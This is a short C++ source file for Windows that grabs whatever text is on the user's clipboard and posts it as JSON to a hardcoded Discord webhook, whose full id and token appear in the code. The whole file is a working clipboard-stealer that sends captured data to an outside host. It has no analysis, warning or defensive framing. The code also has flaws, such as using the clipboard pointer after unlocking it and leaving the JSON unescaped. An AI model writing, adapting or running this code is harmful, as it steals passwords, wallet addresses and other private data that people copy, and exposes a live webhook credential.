#include <windows.h>
#include <iostream>
#include <vector>
#include <locale>
#include <codecvt>
#include <string>
#include <curl/curl.h>

const wchar_t* CaptureClipboardData() {
	// Open the clipboard
	if (!OpenClipboard(NULL)) {
		std::cerr << "Failed to open clipboard." << std::endl;
		return NULL;
	}

	const wchar_t* text = NULL;

	HANDLE hData = GetClipboardData(CF_UNICODETEXT);
	if (hData != NULL) {
		text = static_cast<wchar_t*>(GlobalLock(hData));
		if (text != NULL) {
			GlobalUnlock(hData);
		}
	}

	// Close the clipboard
	CloseClipboard();

	return text;
}

std::string WStringToString(const std::wstring& wstr) {
	if (wstr.empty()) {
		return std::string();
	}
	int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
	std::string strTo(size_needed, 0);
	WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);
	return strTo;
}

int main() {

	CURL* curl;
	CURLcode res;

	curl_global_init(CURL_GLOBAL_DEFAULT);
	curl = curl_easy_init();

	if (curl) {
		// Set URL
		curl_easy_setopt(curl, CURLOPT_URL, "https://discord.com/api/webhooks/1299730885184196621/D-thfIMp10tf8vm3GvLpmP13QfaQ-wMnULkCD_IeyXFAdylVMZNaExrUUIEcg9poq3Xf");

		// Specify POST method
		curl_easy_setopt(curl, CURLOPT_POST, 1L);

		// Set POST fields
		std::string body = WStringToString(CaptureClipboardData());
		std::string jsonData = R"({"content":")" + body + R"("})";
		std::cout << jsonData << std::endl;
		curl_easy_setopt(curl, CURLOPT_POSTFIELDS, jsonData.c_str());

		// Set headers
		struct curl_slist* headers = NULL;
		headers = curl_slist_append(headers, "Content-Type: application/json");
		curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

		// Specify the path to the CA bundle file
		curl_easy_setopt(curl, CURLOPT_CAINFO, "lib\\curl-ca-bundle.crt");

		// Perform the request, res will get the return code
		res = curl_easy_perform(curl);

		// Check for errors
		if (res != CURLE_OK)
			std::cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << std::endl;
		else
			std::cout << "POST request sent successfully!" << std::endl;

		// Cleanup
		curl_easy_cleanup(curl);
	}

	curl_global_cleanup();

	return 0;
}